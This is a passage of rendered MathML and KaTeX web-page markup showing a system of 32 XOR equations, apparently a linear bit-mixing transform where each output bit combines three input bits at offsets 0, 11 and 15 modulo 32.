displaystyle="false"><mrow><msub><mi>a</mi><mn>7</mn></msub><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>8</mn></msub><mo>=</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>9</mn></msub><mo>=</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>10</mn></msub><mo>=</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><mo>=</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>12</mn></msub><mo>=</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>13</mn></msub><mo>=</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>14</mn></msub><mo>=</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>15</mn></msub><mo>=</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>16</mn></msub><mo>=</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>17</mn></msub><mo>=</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>18</mn></msub><mo>=</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>19</mn></msub><mo>=</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>20</mn></msub><mo>=</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><mo>=</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>22</mn></msub><mo>=</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>23</mn></msub><mo>=</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>24</mn></msub><mo>=</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>25</mn></msub><mo>=</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>26</mn></msub><mo>=</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>27</mn></msub><mo>=</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>28</mn></msub><mo>=</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>29</mn></msub><mo>=</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>30</mn></msub><mo>=</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>31</mn></msub><mo>=</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} a_{0} = b_{0} \oplus b_{11} \oplus b_{15} \\ a_{1} = b_{1} \oplus b_{12} \oplus b_{16} \\ a_{2} = b_{2} \oplus b_{13} \oplus b_{17} \\ a_{3} = b_{3} \oplus b_{14} \oplus b_{18} \\ a_{4} = b_{4} \oplus b_{15} \oplus b_{19} \\ a_{5} = b_{5} \oplus b_{16} \oplus b_{20} \\ a_{6} = b_{6} \oplus b_{17} \oplus b_{21} \\ a_{7} = b_{7} \oplus b_{18} \oplus b_{22} \\ a_{8} = b_{8} \oplus b_{19} \oplus b_{23} \\ a_{9} = b_{9} \oplus b_{20} \oplus b_{24} \\ a_{10} = b_{10} \oplus b_{21} \oplus b_{25} \\ a_{11} = b_{11} \oplus b_{22} \oplus b_{26} \\ a_{12} = b_{12} \oplus b_{23} \oplus b_{27} \\ a_{13} = b_{13} \oplus b_{24} \oplus b_{28} \\ a_{14} = b_{14} \oplus b_{25} \oplus b_{29} \\ a_{15} = b_{15} \oplus b_{26} \oplus b_{30} \\ a_{16} = b_{16} \oplus b_{27} \oplus b_{31} \\ a_{17} = b_{17} \oplus b_{28} \oplus b_{0} \\ a_{18} = b_{18} \oplus b_{29} \oplus b_{1} \\ a_{19} = b_{19} \oplus b_{30} \oplus b_{2} \\ a_{20} = b_{20} \oplus b_{31} \oplus b_{3} \\ a_{21} = b_{21} \oplus b_{0} \oplus b_{4} \\ a_{22} = b_{22} \oplus b_{1} \oplus b_{5} \\ a_{23} = b_{23} \oplus b_{2} \oplus b_{6} \\ a_{24} = b_{24} \oplus b_{3} \oplus b_{7} \\ a_{25} = b_{25} \oplus b_{4} \oplus b_{8} \\ a_{26} = b_{26} \oplus b_{5} \oplus b_{9} \\ a_{27} = b_{27} \oplus b_{6} \oplus b_{10} \\ a_{28} = b_{28} \oplus b_{7} \oplus b_{11} \\ a_{29} = b_{29} \oplus b_{8} \oplus b_{12} \\ a_{30} = b_{30} \oplus b_{9} \oplus b_{13} \\ a_{31} = b_{31} \oplus b_{10} \oplus b_{14} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:46.080000000000034em;vertical-align:-22.790000000000013em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:23.050020000000053em;"><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:18.200010000000002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.90001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.60001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.30001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.00001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.70001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.400009999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.100009999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.800009999999995em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.500009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.200009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.900009999999993em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.600009999999992em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.300009999999991em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.00000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.70000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.40000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.100009999999989em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.800009999999988em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.500009999999987em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.200009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.900009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.600009999999985em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.300009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.000009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.700009999999983em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.400009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.100009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.80000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.50000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.20000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.900009999999979em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.600009999999978em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.300009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.000009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.700009999999976em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.400009999999975em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.100009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.800009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.500009999999973em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.200009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.9000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.600009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.30000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.000009999999969em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.7000099999999705em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.40000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.100009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.8000099999999706em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.5000099999999708em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.200009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.900009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.6000099999999713em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.3000099999999715em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.0000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.7000099999999718em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.400009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.1000099999999722em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.8000099999999724em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.5000099999999725em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.2000099999999727em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.09999000000002711em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.39999000000002694em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.6999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.9999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.2999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.5999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.8999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.1999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.150010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.300010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.600010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.900010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.200010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.500010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.800010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.700010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.000010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.300010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.600010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.900010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.200010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.100010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.400010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.700010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.000010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.300010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.600010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.900010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.200010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.700010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.000010000000028em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.300010000000029em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.60001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.90001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.20001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.500010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.800010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.100010000000033em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.400010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.700010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.000010000000035em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.300010000000036em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.600010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.900010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.200010000000038em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.50001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.80001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.10001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.40001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.70001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.000010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.30001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.60001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.90001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.20001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.500010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.800010000000043em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.100010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.400010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.700010000000045em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.000010000000046em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.300010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.600010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.900010000000048em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.20001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.50001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.80001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.10001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.40001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.700010000000052em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.000010000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.300020000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span 